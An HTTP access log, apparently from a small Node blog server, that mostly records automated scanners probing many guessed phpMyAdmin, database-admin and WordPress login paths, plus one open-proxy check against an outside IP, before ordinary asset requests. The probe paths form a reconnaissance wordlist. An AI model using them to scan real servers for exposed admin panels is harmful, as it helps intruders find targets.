+[0mGET /db/dbweb/index.php?lang=en [32m200 [0m0.782 ms - 5247[0m
+[0mGET /db/websql/index.php?lang=en [32m200 [0m0.680 ms - 5247[0m
+[0mGET /db/webdb/index.php?lang=en [32m200 [0m0.793 ms - 5247[0m
+[0mGET /db/dbadmin/index.php?lang=en [32m200 [0m0.764 ms - 5247[0m
+[0mGET /db/db-admin/index.php?lang=en [32m200 [0m0.698 ms - 5247[0m
+[0mGET /db/phpmyadmin3/index.php?lang=en [32m200 [0m0.793 ms - 5247[0m
+[0mGET /db/phpMyAdmin3/index.php?lang=en [32m200 [0m0.656 ms - 5247[0m
+[0mGET /db/phpMyAdmin-3/index.php?lang=en [32m200 [0m0.722 ms - 5247[0m
+[0mGET /administrator/phpmyadmin/index.php?lang=en [32m200 [0m0.824 ms - 5247[0m
+[0mGET /administrator/phpMyAdmin/index.php?lang=en [32m200 [0m0.723 ms - 5247[0m
+[0mGET /administrator/db/index.php?lang=en [32m200 [0m0.687 ms - 5247[0m
+[0mGET /administrator/web/index.php?lang=en [32m200 [0m0.739 ms - 5247[0m
+[0mGET /administrator/pma/index.php?lang=en [32m200 [0m1.250 ms - 5247[0m
+[0mGET /administrator/PMA/index.php?lang=en [32m200 [0m0.726 ms - 5247[0m
+[0mGET /administrator/admin/index.php?lang=en [32m200 [0m0.822 ms - 5247[0m
+[0mGET /phpMyAdmin2/index.php?lang=en [32m200 [0m0.756 ms - 5247[0m
+[0mGET /phpMyAdmin3/index.php?lang=en [32m200 [0m0.770 ms - 5247[0m
+[0mGET /phpMyAdmin4/index.php?lang=en [32m200 [0m0.815 ms - 5247[0m
+[0mGET /phpMyAdmin-3/index.php?lang=en [32m200 [0m0.822 ms - 5247[0m
+[0mGET /php-my-admin/index.php?lang=en [32m200 [0m0.818 ms - 5247[0m
+[0mGET /PMA2011/index.php?lang=en [32m200 [0m0.793 ms - 5247[0m
+[0mGET /PMA2012/index.php?lang=en [32m200 [0m0.813 ms - 5247[0m
+[0mGET /PMA2013/index.php?lang=en [32m200 [0m0.771 ms - 5247[0m
+[0mGET /PMA2014/index.php?lang=en [32m200 [0m0.804 ms - 5247[0m
+[0mGET /PMA2015/index.php?lang=en [32m200 [0m0.804 ms - 5247[0m
+[0mGET /PMA2016/index.php?lang=en [32m200 [0m0.830 ms - 5247[0m
+[0mGET /PMA2017/index.php?lang=en [32m200 [0m1.259 ms - 5247[0m
+[0mGET /PMA2018/index.php?lang=en [32m200 [0m0.816 ms - 5247[0m
+[0mGET /pma2011/index.php?lang=en [32m200 [0m0.804 ms - 5247[0m
+[0mGET /pma2012/index.php?lang=en [32m200 [0m0.805 ms - 5247[0m
+[0mGET /pma2013/index.php?lang=en [32m200 [0m0.852 ms - 5247[0m
+[0mGET /pma2014/index.php?lang=en [32m200 [0m0.835 ms - 5247[0m
+[0mGET /pma2015/index.php?lang=en [32m200 [0m0.793 ms - 5247[0m
+[0mGET /pma2016/index.php?lang=en [32m200 [0m0.813 ms - 5247[0m
+[0mGET /pma2017/index.php?lang=en [32m200 [0m0.838 ms - 5247[0m
+[0mGET /pma2018/index.php?lang=en [32m200 [0m0.795 ms - 5247[0m
+[0mGET /pma2019/index.php?lang=en [32m200 [0m0.821 ms - 5247[0m
+[0mGET /phpmyadmin2011/index.php?lang=en [32m200 [0m0.849 ms - 5247[0m
+[0mGET /phpmyadmin2012/index.php?lang=en [32m200 [0m0.839 ms - 5247[0m
+[0mGET /phpmyadmin2013/index.php?lang=en [32m200 [0m0.860 ms - 5247[0m
+[0mGET /phpmyadmin2014/index.php?lang=en [32m200 [0m2.091 ms - 5247[0m
+[0mGET /phpmyadmin2015/index.php?lang=en [32m200 [0m0.816 ms - 5247[0m
+[0mGET /phpmyadmin2016/index.php?lang=en [32m200 [0m0.804 ms - 5247[0m
+[0mGET /phpmyadmin2017/index.php?lang=en [32m200 [0m0.818 ms - 5247[0m
+[0mGET /phpmyadmin2018/index.php?lang=en [32m200 [0m0.851 ms - 5247[0m
+[0mGET /phpmyadmin2019/index.php?lang=en [32m200 [0m0.857 ms - 5247[0m
+[0mGET /index.php?lang=en [32m200 [0m0.835 ms - 5247[0m
+[0mGET /news/wp-login.php [32m200 [0m0.855 ms - 5247[0m
+[0mGET /politic/wp-login.php [32m200 [0m0.891 ms - 5247[0m
+[0mGET / [32m200 [0m0.560 ms - 5247[0m
+[0mGET /politic/wp-login.php [32m200 [0m0.822 ms - 5247[0m
+[0mGET /portal/wp-login.php [32m200 [0m1.612 ms - 5247[0m
+[0mGET /portal/wp-login.php [32m200 [0m8.936 ms - 5247[0m
+[0mGET /user/soapCaller.bs [32m200 [0m1.783 ms - 5247[0m
+[0mGET /portal2/wp-login.php [32m200 [0m0.840 ms - 5247[0m
+[0mGET http://5.188.210.101/echo.php [32m200 [0m24.221 ms - 5247[0m
+[0mGET /mysql/admin/index.php?lang=en [32m200 [0m0.873 ms - 5247[0m
+[0mGET /mysql/dbadmin/index.php?lang=en [32m200 [0m0.816 ms - 5247[0m
+[0mGET /mysql/sqlmanager/index.php?lang=en [32m200 [0m0.811 ms - 5247[0m
+[0mGET /mysql/mysqlmanager/index.php?lang=en [32m200 [0m0.912 ms - 5247[0m
+[0mGET /phpmyadmin/index.php?lang=en [32m200 [0m0.818 ms - 5247[0m
+[0mGET /phpMyadmin/index.php?lang=en [32m200 [0m0.859 ms - 5247[0m
+[0mGET /phpMyAdmin/index.php?lang=en [32m200 [0m0.895 ms - 5247[0m
+[0mGET /phpmyAdmin/index.php?lang=en [32m200 [0m0.862 ms - 5247[0m
+[0mGET /phpmyadmin2/index.php?lang=en [32m200 [0m0.816 ms - 5247[0m
+[0mGET /phpmyadmin3/index.php?lang=en [32m200 [0m0.826 ms - 5247[0m
+[0mGET /phpmyadmin4/index.php?lang=en [32m200 [0m0.943 ms - 5247[0m
+[0mGET /2phpmyadmin/index.php?lang=en [32m200 [0m0.864 ms - 5247[0m
+[0mGET /wp-content/plugins/portable-phpmyadmin/wp-pma-mod/index.php?lang=en [32m200 [0m0.826 ms - 5247[0m
+[0mGET /phpmy/index.php?lang=en [32m200 [0m2.222 ms - 5247[0m
+[0mGET /phppma/index.php?lang=en [32m200 [0m0.805 ms - 5247[0m
+[0mGET /myadmin/index.php?lang=en [32m200 [0m0.854 ms - 5247[0m
+[0mGET /shopdb/index.php?lang=en [32m200 [0m0.873 ms - 5247[0m
+[0mGET /MyAdmin/index.php?lang=en [32m200 [0m0.870 ms - 5247[0m
+[0mGET /program/index.php?lang=en [32m200 [0m0.860 ms - 5247[0m
+[0mGET /PMA/index.php?lang=en [32m200 [0m0.858 ms - 5247[0m
+[0mGET /dbadmin/index.php?lang=en [32m200 [0m0.849 ms - 5247[0m
+[0mGET /pma/index.php?lang=en [32m200 [0m0.847 ms - 5247[0m
+[0mGET /db/index.php?lang=en [32m200 [0m0.807 ms - 5247[0m
+[0mGET /admin/index.php?lang=en [32m200 [0m0.849 ms - 5247[0m
+[0mGET /mysql/index.php?lang=en [32m200 [0m0.758 ms - 5247[0m
+[0mGET /database/index.php?lang=en [32m200 [0m0.796 ms - 5247[0m
+[0mGET /db/phpmyadmin/index.php?lang=en [32m200 [0m0.801 ms - 5247[0m
+[0mGET /db/phpMyAdmin/index.php?lang=en [32m200 [0m1.259 ms - 5247[0m
+[0mGET /sqlmanager/index.php?lang=en [32m200 [0m0.819 ms - 5247[0m
+[0mGET /mysqlmanager/index.php?lang=en [32m200 [0m0.862 ms - 5247[0m
+[0mGET /php-myadmin/index.php?lang=en [32m200 [0m0.860 ms - 5247[0m
+[0mGET /phpmy-admin/index.php?lang=en [32m200 [0m0.860 ms - 5247[0m
+[0mGET /mysqladmin/index.php?lang=en [32m200 [0m0.834 ms - 5247[0m
+[0mGET /mysql-admin/index.php?lang=en [32m200 [0m0.898 ms - 5247[0m
+[0mGET /admin/phpmyadmin/index.php?lang=en [32m200 [0m0.822 ms - 5247[0m
+[0mGET /admin/phpMyAdmin/index.php?lang=en [32m200 [0m0.824 ms - 5247[0m
+[0mGET /admin/sysadmin/index.php?lang=en [32m200 [0m0.856 ms - 5247[0m
+[0mGET /admin/sqladmin/index.php?lang=en [32m200 [0m0.848 ms - 5247[0m
+[0mGET /admin/db/index.php?lang=en [32m200 [0m0.852 ms - 5247[0m
+[0mGET /admin/web/index.php?lang=en [32m200 [0m0.795 ms - 5247[0m
+[0mGET /admin/pMA/index.php?lang=en [32m200 [0m0.873 ms - 5247[0m
+[0mGET /mysql/pma/index.php?lang=en [32m200 [0m1.318 ms - 5247[0m
+[0mGET /mysql/db/index.php?lang=en [32m200 [0m0.852 ms - 5247[0m
+[0mGET /mysql/web/index.php?lang=en [32m200 [0m0.881 ms - 5247[0m
+[0mGET /mysql/pMA/index.php?lang=en [32m200 [0m0.812 ms - 5247[0m
+[0mGET /sql/phpmanager/index.php?lang=en [32m200 [0m0.807 ms - 5247[0m
+[0mGET /sql/php-myadmin/index.php?lang=en [32m200 [0m0.823 ms - 5247[0m
+[0mGET /sql/phpmy-admin/index.php?lang=en [32m200 [0m0.840 ms - 5247[0m
+[0mGET /sql/sql/index.php?lang=en [32m200 [0m0.802 ms - 5247[0m
+[0mGET /sql/myadmin/index.php?lang=en [32m200 [0m0.768 ms - 5247[0m
+[0mGET /sql/webadmin/index.php?lang=en [32m200 [0m2.494 ms - 5247[0m
+[0mGET /sql/sqlweb/index.php?lang=en [32m200 [0m0.805 ms - 5247[0m
+[0mGET /sql/websql/index.php?lang=en [32m200 [0m0.783 ms - 5247[0m
+[0mGET /sql/webdb/index.php?lang=en [32m200 [0m0.791 ms - 5247[0m
+[0mGET /sql/sqladmin/index.php?lang=en [32m200 [0m0.809 ms - 5247[0m
+[0mGET /sql/sql-admin/index.php?lang=en [32m200 [0m1.250 ms - 5247[0m
+[0mGET /sql/phpmyadmin2/index.php?lang=en [32m200 [0m0.803 ms - 5247[0m
+[0mGET /sql/phpMyAdmin2/index.php?lang=en [32m200 [0m0.813 ms - 5247[0m
+[0mGET /sql/phpMyAdmin/index.php?lang=en [32m200 [0m0.777 ms - 5247[0m
+[0mGET /db/myadmin/index.php?lang=en [32m200 [0m0.819 ms - 5247[0m
+[0mGET /db/webadmin/index.php?lang=en [32m200 [0m0.868 ms - 5247[0m
+[0mGET /db/dbweb/index.php?lang=en [32m200 [0m0.806 ms - 5247[0m
+[0mGET /db/websql/index.php?lang=en [32m200 [0m0.832 ms - 5247[0m
+[0mGET /db/webdb/index.php?lang=en [32m200 [0m0.819 ms - 5247[0m
+[0mGET /db/dbadmin/index.php?lang=en [32m200 [0m0.805 ms - 5247[0m
+[0mGET /db/db-admin/index.php?lang=en [32m200 [0m0.843 ms - 5247[0m
+[0mGET /db/phpmyadmin3/index.php?lang=en [32m200 [0m0.823 ms - 5247[0m
+[0mGET /db/phpMyAdmin3/index.php?lang=en [32m200 [0m0.829 ms - 5247[0m
+[0mGET /db/phpMyAdmin-3/index.php?lang=en [32m200 [0m0.794 ms - 5247[0m
+[0mGET /administrator/phpmyadmin/index.php?lang=en [32m200 [0m1.279 ms - 5247[0m
+[0mGET /administrator/phpMyAdmin/index.php?lang=en [32m200 [0m0.787 ms - 5247[0m
+[0mGET /administrator/db/index.php?lang=en [32m200 [0m0.820 ms - 5247[0m
+[0mGET /administrator/web/index.php?lang=en [32m200 [0m0.819 ms - 5247[0m
+[0mGET /administrator/pma/index.php?lang=en [32m200 [0m0.852 ms - 5247[0m
+[0mGET /administrator/PMA/index.php?lang=en [32m200 [0m0.802 ms - 5247[0m
+[0mGET /administrator/admin/index.php?lang=en [32m200 [0m0.800 ms - 5247[0m
+[0mGET /phpMyAdmin2/index.php?lang=en [32m200 [0m0.829 ms - 5247[0m
+[0mGET /phpMyAdmin3/index.php?lang=en [32m200 [0m0.821 ms - 5247[0m
+[0mGET /phpMyAdmin4/index.php?lang=en [32m200 [0m1.857 ms - 5247[0m
+[0mGET /phpMyAdmin-3/index.php?lang=en [32m200 [0m0.884 ms - 5247[0m
+[0mGET /php-my-admin/index.php?lang=en [32m200 [0m4.645 ms - 5247[0m
+[0mGET /PMA2011/index.php?lang=en [32m200 [0m1.466 ms - 5247[0m
+[0mGET /PMA2012/index.php?lang=en [32m200 [0m0.796 ms - 5247[0m
+[0mGET /PMA2013/index.php?lang=en [32m200 [0m1.221 ms - 5247[0m
+[0mGET /PMA2014/index.php?lang=en [32m200 [0m0.830 ms - 5247[0m
+[0mGET /PMA2015/index.php?lang=en [32m200 [0m0.836 ms - 5247[0m
+[0mGET /PMA2016/index.php?lang=en [32m200 [0m0.756 ms - 5247[0m
+[0mGET /PMA2017/index.php?lang=en [32m200 [0m0.830 ms - 5247[0m
+[0mGET /PMA2018/index.php?lang=en [32m200 [0m0.777 ms - 5247[0m
+[0mGET /pma2011/index.php?lang=en [32m200 [0m0.834 ms - 5247[0m
+[0mGET /pma2012/index.php?lang=en [32m200 [0m0.799 ms - 5247[0m
+[0mGET /pma2013/index.php?lang=en [32m200 [0m0.778 ms - 5247[0m
+[0mGET /pma2014/index.php?lang=en [32m200 [0m0.775 ms - 5247[0m
+[0mGET /pma2015/index.php?lang=en [32m200 [0m0.838 ms - 5247[0m
+[0mGET /pma2016/index.php?lang=en [32m200 [0m0.799 ms - 5247[0m
+[0mGET /pma2017/index.php?lang=en [32m200 [0m0.810 ms - 5247[0m
+[0mGET /pma2018/index.php?lang=en [32m200 [0m1.007 ms - 5247[0m
+[0mGET /pma2019/index.php?lang=en [32m200 [0m1.363 ms - 5247[0m
+[0mGET /phpmyadmin2011/index.php?lang=en [32m200 [0m0.795 ms - 5247[0m
+[0mGET /phpmyadmin2012/index.php?lang=en [32m200 [0m0.800 ms - 5247[0m
+[0mGET /phpmyadmin2013/index.php?lang=en [32m200 [0m0.812 ms - 5247[0m
+[0mGET /phpmyadmin2014/index.php?lang=en [32m200 [0m0.815 ms - 5247[0m
+[0mGET /phpmyadmin2015/index.php?lang=en [32m200 [0m0.779 ms - 5247[0m
+[0mGET /phpmyadmin2016/index.php?lang=en [32m200 [0m0.775 ms - 5247[0m
+[0mGET /phpmyadmin2017/index.php?lang=en [32m200 [0m0.776 ms - 5247[0m
+[0mGET /phpmyadmin2018/index.php?lang=en [32m200 [0m0.807 ms - 5247[0m
+[0mGET /phpmyadmin2019/index.php?lang=en [32m200 [0m0.781 ms - 5247[0m
+[0mGET /index.php?lang=en [32m200 [0m0.781 ms - 5247[0m
+[0mHEAD /robots.txt [32m200 [0m0.669 ms - 5247[0m
+[0mGET / [32m200 [0m0.535 ms - 5247[0m
+[0mGET / [32m200 [0m0.601 ms - 5247[0m
+[0mGET /mysql/admin/index.php?lang=en [32m200 [0m0.802 ms - 5247[0m
+[0mGET /mysql/dbadmin/index.php?lang=en [32m200 [0m0.769 ms - 5247[0m
+[0mGET /mysql/sqlmanager/index.php?lang=en [32m200 [0m0.807 ms - 5247[0m
+[0mGET /mysql/mysqlmanager/index.php?lang=en [32m200 [0m0.750 ms - 5247[0m
+[0mGET /phpmyadmin/index.php?lang=en [32m200 [0m0.836 ms - 5247[0m
+[0mGET /phpMyadmin/index.php?lang=en [32m200 [0m0.741 ms - 5247[0m
+[0mGET /phpMyAdmin/index.php?lang=en [32m200 [0m0.798 ms - 5247[0m
+[0mGET /phpmyAdmin/index.php?lang=en [32m200 [0m0.774 ms - 5247[0m
+[0mGET /phpmyadmin2/index.php?lang=en [32m200 [0m0.776 ms - 5247[0m
+[0mGET /phpmyadmin3/index.php?lang=en [32m200 [0m0.809 ms - 5247[0m
+[0mGET /phpmyadmin4/index.php?lang=en [32m200 [0m0.867 ms - 5247[0m
+[0mGET /2phpmyadmin/index.php?lang=en [32m200 [0m0.829 ms - 5247[0m
+[0mGET /wp-content/plugins/portable-phpmyadmin/wp-pma-mod/index.php?lang=en [32m200 [0m0.802 ms - 5247[0m
+[0mGET /phpmy/index.php?lang=en [32m200 [0m0.811 ms - 5247[0m
+[0mGET /phppma/index.php?lang=en [32m200 [0m0.778 ms - 5247[0m
+[0mGET /myadmin/index.php?lang=en [32m200 [0m0.776 ms - 5247[0m
+[0mGET /shopdb/index.php?lang=en [32m200 [0m0.782 ms - 5247[0m
+[0mGET /MyAdmin/index.php?lang=en [32m200 [0m0.799 ms - 5247[0m
+[0mGET /program/index.php?lang=en [32m200 [0m0.772 ms - 5247[0m
+[0mGET /PMA/index.php?lang=en [32m200 [0m0.806 ms - 5247[0m
+[0mGET /dbadmin/index.php?lang=en [32m200 [0m0.798 ms - 5247[0m
+[0mGET /pma/index.php?lang=en [32m200 [0m0.784 ms - 5247[0m
+[0mGET /db/index.php?lang=en [32m200 [0m0.775 ms - 5247[0m
+[0mGET /admin/index.php?lang=en [32m200 [0m0.838 ms - 5247[0m
+[0mGET /mysql/index.php?lang=en [32m200 [0m0.752 ms - 5247[0m
+[0mGET /database/index.php?lang=en [32m200 [0m0.805 ms - 5247[0m
+[0mGET /db/phpmyadmin/index.php?lang=en [32m200 [0m1.276 ms - 5247[0m
+[0mGET /db/phpMyAdmin/index.php?lang=en [32m200 [0m0.816 ms - 5247[0m
+[0mGET /sqlmanager/index.php?lang=en [32m200 [0m0.763 ms - 5247[0m
+[0mGET /mysqlmanager/index.php?lang=en [32m200 [0m0.761 ms - 5247[0m
+[0mGET /php-myadmin/index.php?lang=en [32m200 [0m0.808 ms - 5247[0m
+[0mGET /phpmy-admin/index.php?lang=en [32m200 [0m0.800 ms - 5247[0m
+[0mGET /mysqladmin/index.php?lang=en [32m200 [0m0.798 ms - 5247[0m
+[0mGET /mysql-admin/index.php?lang=en [32m200 [0m0.803 ms - 5247[0m
+[0mGET /admin/phpmyadmin/index.php?lang=en [32m200 [0m0.767 ms - 5247[0m
+[0mGET /admin/phpMyAdmin/index.php?lang=en [32m200 [0m0.863 ms - 5247[0m
+[0mGET /admin/sysadmin/index.php?lang=en [32m200 [0m0.752 ms - 5247[0m
+[0mGET /admin/sqladmin/index.php?lang=en [32m200 [0m0.786 ms - 5247[0m
+[0mGET /admin/db/index.php?lang=en [32m200 [0m0.801 ms - 5247[0m
+[0mGET /admin/web/index.php?lang=en [32m200 [0m0.808 ms - 5247[0m
+[0mGET /admin/pMA/index.php?lang=en [32m200 [0m1.218 ms - 5247[0m
+[0mGET /mysql/pma/index.php?lang=en [32m200 [0m0.795 ms - 5247[0m
+[0mGET /mysql/db/index.php?lang=en [32m200 [0m0.756 ms - 5247[0m
+[0mGET /mysql/web/index.php?lang=en [32m200 [0m0.777 ms - 5247[0m
+[0mGET /mysql/pMA/index.php?lang=en [32m200 [0m0.791 ms - 5247[0m
+[0mGET /sql/phpmanager/index.php?lang=en [32m200 [0m0.751 ms - 5247[0m
+[0mGET /sql/php-myadmin/index.php?lang=en [32m200 [0m0.812 ms - 5247[0m
+[0mGET /sql/phpmy-admin/index.php?lang=en [32m200 [0m0.761 ms - 5247[0m
+[0mGET /sql/sql/index.php?lang=en [32m200 [0m0.808 ms - 5247[0m
+[0mGET /sql/myadmin/index.php?lang=en [32m200 [0m0.842 ms - 5247[0m
+[0mGET /sql/webadmin/index.php?lang=en [32m200 [0m0.834 ms - 5247[0m
+[0mGET /sql/sqlweb/index.php?lang=en [32m200 [0m0.778 ms - 5247[0m
+[0mGET /sql/websql/index.php?lang=en [32m200 [0m0.803 ms - 5247[0m
+[0mGET /sql/webdb/index.php?lang=en [32m200 [0m0.827 ms - 5247[0m
+[0mGET /sql/sqladmin/index.php?lang=en [32m200 [0m0.842 ms - 5247[0m
+[0mGET /sql/sql-admin/index.php?lang=en [32m200 [0m5.193 ms - 5247[0m
+[0mGET /sql/phpmyadmin2/index.php?lang=en [32m200 [0m0.756 ms - 5247[0m
+[0mGET /sql/phpMyAdmin2/index.php?lang=en [32m200 [0m0.792 ms - 5247[0m
+[0mGET /sql/phpMyAdmin/index.php?lang=en [32m200 [0m0.755 ms - 5247[0m
+[0mGET /db/myadmin/index.php?lang=en [32m200 [0m0.752 ms - 5247[0m
+[0mGET /db/webadmin/index.php?lang=en [32m200 [0m0.734 ms - 5247[0m
+[0mGET /db/dbweb/index.php?lang=en [32m200 [0m0.820 ms - 5247[0m
+[0mGET /db/websql/index.php?lang=en [32m200 [0m0.836 ms - 5247[0m
+[0mGET /db/webdb/index.php?lang=en [32m200 [0m0.757 ms - 5247[0m
+[0mGET /db/dbadmin/index.php?lang=en [32m200 [0m0.795 ms - 5247[0m
+[0mGET /db/db-admin/index.php?lang=en [32m200 [0m0.811 ms - 5247[0m
+[0mGET /db/phpmyadmin3/index.php?lang=en [32m200 [0m0.801 ms - 5247[0m
+[0mGET /db/phpMyAdmin3/index.php?lang=en [32m200 [0m0.781 ms - 5247[0m
+[0mGET /db/phpMyAdmin-3/index.php?lang=en [32m200 [0m0.839 ms - 5247[0m
+[0mGET /administrator/phpmyadmin/index.php?lang=en [32m200 [0m0.791 ms - 5247[0m
+[0mGET /administrator/phpMyAdmin/index.php?lang=en [32m200 [0m0.792 ms - 5247[0m
+[0mGET /administrator/db/index.php?lang=en [32m200 [0m0.814 ms - 5247[0m
+[0mGET /administrator/web/index.php?lang=en [32m200 [0m0.768 ms - 5247[0m
+[0mGET /administrator/pma/index.php?lang=en [32m200 [0m0.812 ms - 5247[0m
+[0mGET /administrator/PMA/index.php?lang=en [32m200 [0m0.787 ms - 5247[0m
+[0mGET /administrator/admin/index.php?lang=en [32m200 [0m0.775 ms - 5247[0m
+[0mGET /phpMyAdmin2/index.php?lang=en [32m200 [0m0.784 ms - 5247[0m
+[0mGET /phpMyAdmin3/index.php?lang=en [32m200 [0m0.832 ms - 5247[0m
+[0mGET /phpMyAdmin4/index.php?lang=en [32m200 [0m0.776 ms - 5247[0m
+[0mGET /phpMyAdmin-3/index.php?lang=en [32m200 [0m0.781 ms - 5247[0m
+[0mGET /php-my-admin/index.php?lang=en [32m200 [0m0.795 ms - 5247[0m
+[0mGET /PMA2011/index.php?lang=en [32m200 [0m0.740 ms - 5247[0m
+[0mGET /PMA2012/index.php?lang=en [32m200 [0m1.115 ms - 5247[0m
+[0mGET /PMA2013/index.php?lang=en [32m200 [0m0.811 ms - 5247[0m
+[0mGET /PMA2014/index.php?lang=en [32m200 [0m0.802 ms - 5247[0m
+[0mGET /PMA2015/index.php?lang=en [32m200 [0m0.766 ms - 5247[0m
+[0mGET /PMA2016/index.php?lang=en [32m200 [0m0.824 ms - 5247[0m
+[0mGET /PMA2017/index.php?lang=en [32m200 [0m0.786 ms - 5247[0m
+[0mGET / [32m200 [0m1.750 ms - 5247[0m
+[0mGET / [32m200 [0m10.637 ms - 5247[0m
+[0mGET /js/angular-route.min.js [32m200 [0m1.721 ms - 5721[0m
+[0mGET /stylesheets/style.css [32m200 [0m1.661 ms - 111[0m
+[0mGET /blogApp.js [32m200 [0m3.231 ms - 4289[0m
+[0mGET /js/angular.min.js [32m200 [0m5.148 ms - 176241[0m
+[0mGET /css/bootstrap.min.css [32m200 [0m3.114 ms - 155758[0m
+[0mGET /js/angular-route.min.js [32m200 [0m0.830 ms - 5721[0m
+[0mGET /css/bootstrap.min.css [32m200 [0m0.710 ms - 155758[0m
+[0mGET /blogApp.js [32m200 [0m3.527 ms - 4289[0m
+[0mGET /stylesheets/style.css [32m200 [0m0.294 ms - 111[0m
+[0mGET / [32m200 [0m0.537 ms - 5247[0m
+[0mHEAD /robots.txt [32m200 [0m3.814 ms - 5247[0m
+[0mGET /admin/assets/js/views/login.js [32m200 [0m0.891 ms - 5247[0m
+[0mGET / [32m200 [0m0.520 ms - 5247[0m
+[0mGET / [32m200 [0m0.564 ms - 5247[0m
+[0mGET / [32m200 [0m0.516 ms - 5247[0m
